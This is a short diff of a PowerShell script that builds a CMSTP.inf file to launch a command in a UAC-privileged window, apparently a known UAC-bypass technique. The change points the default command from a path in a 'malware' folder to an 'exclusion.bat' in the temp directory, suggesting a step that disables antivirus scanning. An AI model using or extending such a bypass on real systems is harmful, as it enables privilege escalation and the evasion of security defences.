@@ -5,7 +5,7 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'C:\Users\boris\Desktop\malware\exclusion.bat'
+	[String]$CommandToExecute = '%temp%\exclusion.bat'
 	)
 
 $InfContent = @"
